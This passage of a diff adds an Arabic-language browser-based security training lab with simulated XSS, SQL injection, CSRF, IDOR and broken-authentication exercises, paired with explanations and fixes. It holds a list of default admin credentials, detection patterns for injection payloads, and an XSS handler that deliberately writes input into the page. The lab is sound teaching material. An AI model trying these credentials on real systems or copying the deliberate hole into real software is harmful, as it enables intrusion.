+<span class="str">Set-Cookie: session=xyz; SameSite=Strict; HttpOnly</span>
+
+<span class="cm">// ✅ التحقق من Origin header</span>
+<span class="kw">if</span> (<span class="var">request</span>.<span class="fn">headers</span>[<span class="str">'origin'</span>] !== <span class="str">'https://mysite.com'</span>) {
+  <span class="fn">reject</span>();
+}
+      </div>
+    `
+  },
+
+  idor: {
+    attack: `
+      <div class="score-bar">
+        <span class="score-label">المهمة:</span>
+        <span style="color:var(--text);font-size:0.9rem">اقرأ بيانات مستخدمين آخرين بتغيير الـ ID</span>
+        <span class="score-val">${labs.idor.points} pts</span>
+        <span id="idor-badge" style="display:none" class="badge-solved">✓ SOLVED</span>
+      </div>
+      <div class="lab-panel">
+        <div>
+          <h3 style="margin-bottom:1rem;font-size:1rem">API Profile Endpoint</h3>
+          <div class="alert alert-info" style="margin-bottom:1rem">أنت مسجّل كـ user_id = 42. جرّب تغيير الـ ID.</div>
+          <div class="input-group">
+            <label>User ID</label>
+            <input class="vuln-input" id="idor-id" type="number" value="42" min="1" max="99">
+          </div>
+          <div class="code-block" style="margin-bottom:1rem;font-size:0.75rem">GET /api/profile/<span id="idor-url-id" style="color:var(--accent)">42</span></div>
+          <button class="btn btn-primary" onclick="submitIDOR()">Send Request</button>
+          <div style="margin-top:1rem">
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--muted);margin-bottom:0.5rem">IDs للتجربة:</div>
+            <ul class="payload-list">
+              <li class="payload-pill" onclick="setIDOR(1)">ID: 1 (admin)</li>
+              <li class="payload-pill" onclick="setIDOR(7)">ID: 7</li>
+              <li class="payload-pill" onclick="setIDOR(13)">ID: 13</li>
+              <li class="payload-pill" onclick="setIDOR(99)">ID: 99</li>
+            </ul>
+          </div>
+        </div>
+        <div>
+          <div id="idor-result"><div class="alert alert-info">أرسل طلب للبدء...</div></div>
+        </div>
+      </div>
+    `,
+    explain: `
+      <h3 style="margin-bottom:1rem">ما هو IDOR؟</h3>
+      <p style="color:var(--muted);line-height:1.8;margin-bottom:1.5rem">
+        Insecure Direct Object Reference — عندما يتحكم المستخدم في معرّف (ID) للوصول لموارد مباشرة 
+        دون التحقق من صلاحيته. الخادم لا يتحقق: "هل هذا المستخدم يملك حق رؤية هذا المورد؟"
+      </p>
+      <div class="alert alert-danger">من أكثر الثغرات شيوعاً ويعتبرها OWASP ضمن أخطر 10 ثغرات.</div>
+    `,
+    fix: `
+      <h3 style="margin-bottom:1rem">الحماية من IDOR</h3>
+      <div class="code-block">
+<span class="cm">// ❌ VULNERABLE</span>
+<span class="fn">app</span>.<span class="fn">get</span>(<span class="str">'/api/profile/:id'</span>, (<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="var">db</span>.<span class="fn">find</span>(<span class="var">req</span>.<span class="var">params</span>.<span class="var">id</span>); <span class="cm">// no auth check!</span>
+});
+
+<span class="cm">// ✅ SAFE — تحقق من الصلاحية</span>
+<span class="fn">app</span>.<span class="fn">get</span>(<span class="str">'/api/profile/:id'</span>, (<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">if</span> (<span class="var">req</span>.<span class="var">user</span>.<span class="var">id</span> !== <span class="var">req</span>.<span class="var">params</span>.<span class="var">id</span>) {
+    <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="str">403</span>).<span class="fn">json</span>({ <span class="var">error</span>: <span class="str">'Forbidden'</span> });
+  }
+  <span class="var">db</span>.<span class="fn">find</span>(<span class="var">req</span>.<span class="var">params</span>.<span class="var">id</span>);
+});
+      </div>
+    `
+  },
+
+  auth: {
+    attack: `
+      <div class="score-bar">
+        <span class="score-label">المهمة:</span>
+        <span style="color:var(--text);font-size:0.9rem">تجاوز نظام المصادقة للوصول كـ admin</span>
+        <span class="score-val">${labs.auth.points} pts</span>
+        <span id="auth-badge" style="display:none" class="badge-solved">✓ SOLVED</span>
+      </div>
+      <div class="lab-panel">
+        <div>
+          <h3 style="margin-bottom:1rem;font-size:1rem">Admin Login Panel</h3>
+          <div class="input-group">
+            <label>Username</label>
+            <input class="vuln-input" id="auth-user" placeholder="جرّب: admin, administrator, root...">
+          </div>
+          <div class="input-group">
+            <label>Password</label>
+            <input class="vuln-input" id="auth-pass" type="text" placeholder="جرّب: admin, password, 123456...">
+          </div>
+          <button class="btn btn-primary" onclick="submitAuth()">Login</button>
+          <div style="margin-top:1rem">
+            <ul class="payload-list">
+              <li class="payload-pill" onclick="setAuth('admin','admin')">admin / admin</li>
+              <li class="payload-pill" onclick="setAuth('administrator','password')">administrator / password</li>
+              <li class="payload-pill" onclick="setAuth('admin','123456')">admin / 123456</li>
+              <li class="payload-pill" onclick="setAuth('root','root')">root / root</li>
+            </ul>
+          </div>
+        </div>
+        <div>
+          <div id="auth-result"><div class="alert alert-info">جرّب بيانات اعتماد ضعيفة...</div></div>
+        </div>
+      </div>
+    `,
+    explain: `
+      <h3 style="margin-bottom:1rem">Broken Authentication</h3>
+      <p style="color:var(--muted);line-height:1.8;margin-bottom:1.5rem">
+        يحدث عندما تكون آليات المصادقة ضعيفة: كلمات مرور افتراضية، عدم وجود rate limiting، 
+        أو جلسات لا تنتهي. المهاجم يستطيع تجربة آلاف كلمات المرور (Brute Force).
+      </p>
+      <div class="alert alert-danger">
+        <strong>إحصائية:</strong> 80% من الاختراقات تبدأ ببيانات اعتماد مسروقة أو ضعيفة.
+      </div>
+    `,
+    fix: `
+      <h3 style="margin-bottom:1rem">تأمين المصادقة</h3>
+      <div class="code-block">
+<span class="cm">// ✅ Rate Limiting</span>
+<span class="kw">const</span> <span class="var">rateLimit</span> = <span class="fn">require</span>(<span class="str">'express-rate-limit'</span>);
+<span class="var">app</span>.<span class="fn">use</span>(<span class="str">'/login'</span>, <span class="fn">rateLimit</span>({ <span class="var">max</span>: <span class="str">5</span>, <span class="var">windowMs</span>: <span class="str">15 * 60 * 1000</span> }));
+
+<span class="cm">// ✅ Hash passwords with bcrypt</span>
+<span class="kw">const</span> <span class="var">hash</span> = <span class="kw">await</span> <span class="var">bcrypt</span>.<span class="fn">hash</span>(<span class="var">password</span>, <span class="str">12</span>);
+
+<span class="cm">// ✅ MFA + Account lockout</span>
+      </div>
+    `
+  }
+};
+
+// ─── FAKE DATA ───
+const fakeUsers = [
+  { id: 1, name: 'Admin User', email: 'admin@bank.com', role: 'ADMIN', ssn: '***-**-1234', balance: '$250,000' },
+  { id: 7, name: 'Sarah Connor', email: 'sarah@email.com', role: 'user', ssn: '***-**-5678', balance: '$3,400' },
+  { id: 13, name: 'John Smith', email: 'john.s@email.com', role: 'user', ssn: '***-**-9012', balance: '$1,200' },
+  { id: 42, name: 'You (Current User)', email: 'you@email.com', role: 'user', ssn: '***-**-3456', balance: '$800' },
+  { id: 99, name: 'CEO Account', email: 'ceo@corp.com', role: 'EXECUTIVE', ssn: '***-**-7890', balance: '$1,200,000' },
+];
+
+// ─── FUNCTIONS ───
+
+function selectLab(id) {
+  state.currentLab = id;
+  document.querySelectorAll('.lab-card').forEach(c => c.classList.remove('active'));
+  event.currentTarget.classList.add('active');
+
+  const lab = labs[id];
+  document.getElementById('lab-title').textContent = lab.title;
+  const badge = document.getElementById('lab-badge');
+  badge.className = 'severity ' + lab.badge;
+  badge.textContent = lab.badgeText;
+
+  renderLab(id);
+  switchTab('attack');
+}
+
+function renderLab(id) {
+  const content = labContent[id];
+  document.getElementById('tab-attack').innerHTML = content.attack;
+  document.getElementById('tab-explain').innerHTML = content.explain;
+  document.getElementById('tab-fix').innerHTML = content.fix;
+
+  if (id === 'idor') {
+    document.getElementById('idor-id').addEventListener('input', e => {
+      document.getElementById('idor-url-id').textContent = e.target.value;
+    });
+  }
+
+  if (state.solved[id]) {
+    const badge = document.getElementById(id + '-badge');
+    if (badge) badge.style.display = 'inline';
+  }
+}
+
+function switchTab(tab) {
+  document.querySelectorAll('.tab-btn').forEach((b, i) => {
+    b.classList.toggle('active', ['attack','explain','fix'][i] === tab);
+  });
+  document.querySelectorAll('.tab-content').forEach((c, i) => {
+    c.classList.toggle('active', ['tab-attack','tab-explain','tab-fix'][i] === 'tab-' + tab);
+  });
+}
+
+function copyPayload(payload, targetId) {
+  const el = document.getElementById(targetId);
+  if (el) el.value = payload;
+}
+
+function setIDOR(id) {
+  document.getElementById('idor-id').value = id;
+  document.getElementById('idor-url-id').textContent = id;
+}
+
+function setAuth(user, pass) {
+  document.getElementById('auth-user').value = user;
+  document.getElementById('auth-pass').value = pass;
+}
+
+function awardPoints(labId) {
+  if (!state.solved[labId]) {
+    state.solved[labId] = true;
+    state.score += labs[labId].points;
+    document.getElementById('nav-score').textContent = state.score + ' pts';
+    document.getElementById('stat-pts').textContent = state.score;
+    document.getElementById('stat-solved').textContent = Object.keys(state.solved).length;
+    updateProgress();
+    const badge = document.getElementById(labId + '-badge');
+    if (badge) { badge.style.display = 'inline'; badge.classList.add('fade-in'); }
+  }
+}
+
+function updateProgress() {
+  const dots = document.querySelectorAll('#main-progress .progress-dot');
+  const solved = Object.keys(state.solved).length;
+  dots.forEach((d, i) => d.classList.toggle('done', i < solved));
+}
+
+// ─── XSS ───
+function submitXSS() {
+  const name = document.getElementById('xss-name').value || 'Anonymous';
+  const comment = document.getElementById('xss-comment').value;
+  const output = document.getElementById('xss-output');
+  const result = document.getElementById('xss-result');
+
+  const hasScript = /<script[\s\S]*?>[\s\S]*?<\/script>/i.test(comment)
+    || /onerror\s*=/i.test(comment)
+    || /onload\s*=/i.test(comment)
+    || /javascript:/i.test(comment);
+
+  const div = document.createElement('div');
+  div.style.cssText = 'border-bottom:1px solid #eee;padding:0.5rem 0;margin-bottom:0.5rem';
+  div.innerHTML = `<strong style="color:#333">${name}:</strong> `;
+
+  if (hasScript) {
+    div.innerHTML += comment;
+    output.innerHTML = '';
+    output.appendChild(div);
+    result.innerHTML = `
+      <div class="alert alert-danger fade-in">
+        🎯 <strong>XSS ناجح!</strong> تم حقن الكود — في الواقع، هذا الكود سيُنفّذ على كل زوار الصفحة.
+      </div>`;
+    awardPoints('xss');
+  } else {
+    div.textContent = name + ': ' + comment;
+    output.innerHTML = '';
+    output.appendChild(div);
+    result.innerHTML = `<div class="alert alert-info">لم يُكتشف payload. جرّب أحد الـ payloads المقترحة.</div>`;
+  }
+}
+
+// ─── SQLi ───
+function submitSQLi() {
+  const pass = document.getElementById('sqli-pass').value;
+  const result = document.getElementById('sqli-result');
+  const table = document.getElementById('sqli-table');
+
+  const isSQLi = /('|--|OR\s+\d+=\d+|OR\s+'[^']*'='[^']*')/i.test(pass);
+
+  if (isSQLi) {
+    result.innerHTML = `<div class="alert alert-danger fade-in">🎯 <strong>SQL Injection ناجح!</strong> تجاوزت المصادقة وحصلت على كل البيانات:</div>`;
+    table.innerHTML = `
+      <table class="sql-table">
+        <tr><th>ID</th><th>Username</th><th>Password</th><th>Email</th></tr>
+        <tr><td>1</td><td>admin</td><td class="sev-critical" style="color:var(--danger)">p@ss123</td><td>admin@site.com</td></tr>
+        <tr><td>2</td><td>user1</td><td class="sev-critical" style="color:var(--danger)">qwerty</td><td>user1@email.com</td></tr>
+        <tr><td>3</td><td>manager</td><td class="sev-critical" style="color:var(--danger)">m@nager99</td><td>mgr@corp.com</td></tr>
+      </table>`;
+    awardPoints('sqli');
+  } else {
+    result.innerHTML = `<div class="alert alert-danger">❌ خطأ في بيانات الاعتماد.</div>`;
+    table.innerHTML = '';
+  }
+}
+
+// ─── CSRF ───
+function normalTransfer() {
+  const amount = parseInt(document.getElementById('csrf-amount').value) || 0;
+  const to = document.getElementById('csrf-to').value;
+  const result = document.getElementById('csrf-result');
+
+  if (amount > 0 && state.csrfBalance >= amount) {
+    state.csrfBalance -= amount;
+    document.getElementById('csrf-bal-num').textContent = state.csrfBalance.toLocaleString();
+    result.innerHTML = `<div class="alert alert-success fade-in">✓ تحويل $${amount} إلى "${to}" — تم بنجاح.</div>`;
+  } else {
+    result.innerHTML = `<div class="alert alert-danger">رصيد غير كافٍ.</div>`;
+  }
+}
+
+function csrfAttack() {
+  const result = document.getElementById('csrf-result');
+  const hiddenAmount = 2500;
+
+  result.innerHTML = `<div class="alert alert-info fade-in">🔄 صفحة خارجية تُرسل طلب خفي...</div>`;
+
+  setTimeout(() => {
+    state.csrfBalance -= hiddenAmount;
+    document.getElementById('csrf-bal-num').textContent = state.csrfBalance.toLocaleString();
+    result.innerHTML = `
+      <div class="alert alert-danger fade-in">
+        ⚡ <strong>CSRF ناجح!</strong><br><br>
+        صفحة خارجية أرسلت طلب تحويل <strong>$${hiddenAmount}</strong> دون علمك!<br>
+        استخدمت كوكيز جلستك المحفوظة — لم تنقر على أي شيء في موقع البنك.
+      </div>`;
+    awardPoints('csrf');
+  }, 1500);
+}
+
+// ─── IDOR ───
+function submitIDOR() {
+  const id = parseInt(document.getElementById('idor-id').value);
+  const result = document.getElementById('idor-result');
+
+  const user = fakeUsers.find(u => u.id === id);
+
+  if (id === 42) {
+    result.innerHTML = `
+      <div class="alert alert-success fade-in">
+        ✓ بياناتك الشخصية:<br><br>
+        <span class="mono">{ id: 42, name: "You", role: "user" }</span>
+      </div>`;
+    return;
+  }
+
+  if (user) {
+    result.innerHTML = `
+      <div class="alert alert-danger fade-in">
+        🎯 <strong>IDOR ناجح!</strong> حصلت على بيانات مستخدم آخر:<br><br>
+        <div class="code-block" style="margin-top:0.75rem">
+{<br>
+&nbsp; id: ${user.id},<br>
+&nbsp; name: "<span style="color:var(--accent)">${user.name}</span>",<br>
+&nbsp; email: "<span style="color:var(--warning)">${user.email}</span>",<br>
+&nbsp; role: "<span style="color:var(--danger)">${user.role}</span>",<br>
+&nbsp; balance: "${user.balance}"<br>
+}
+        </div>
+      </div>`;
+    awardPoints('idor');
+  } else {
+    result.innerHTML = `<div class="alert alert-info">User ID ${id} غير موجود.</div>`;
+  }
+}
+
+// ─── AUTH ───
+const weakCredentials = [
+  ['admin', 'admin'], ['admin', 'password'], ['admin', '123456'],
+  ['administrator', 'administrator'], ['administrator', 'password'],
+  ['root', 'root'], ['root', 'toor'], ['admin', ''], ['admin', 'admin123']
+];
+
+function submitAuth() {
+  const user = document.getElementById('auth-user').value.toLowerCase();
+  const pass = document.getElementById('auth-pass').value;
+  const result = document.getElementById('auth-result');
+
+  const found = weakCredentials.find(([u, p]) => u === user && p === pass);
+
+  if (found) {
+    result.innerHTML = `
+      <div class="alert alert-danger fade-in">
+        🎯 <strong>Broken Auth ناجح!</strong><br><br>
+        دخلت كـ <strong>Administrator</strong> بكلمة مرور افتراضية:<br>
+        <span class="mono">${found[0]} / ${found[1] || '(empty)'}</span><br><br>
+        هذا يحدث في آلاف الأنظمة الحقيقية.
+      </div>`;
+    awardPoints('auth');
+  } else {
+    result.innerHTML = `<div class="alert alert-danger">❌ بيانات اعتماد خاطئة. جرّب combination آخر.</div>`;
+  }
+}
+
+function demoFix(type) {
+  if (type === 'xss') {
+    document.getElementById('fix-demo-xss').innerHTML = `
+      <div class="alert alert-success fade-in" style="margin-top:1rem">
+        ✅ النسخة الآمنة: <span class="mono">&lt;script&gt;alert(1)&lt;/script&gt;</span> 
+        ستظهر كنص عادي بدل تنفيذه.
+      </div>`;
+  }
+}
+
+// ─── INIT ───
+function init() {
+  const prog = document.getElementById('main-progress');
+  for (let i = 0; i < 5; i++) {
+    const dot = document.createElement('div');
+    dot.className = 'progress-dot';
+    prog.appendChild(dot);
+  }
+  renderLab('xss');
+}
+
+init();
+</script>
+</body>
+</html>
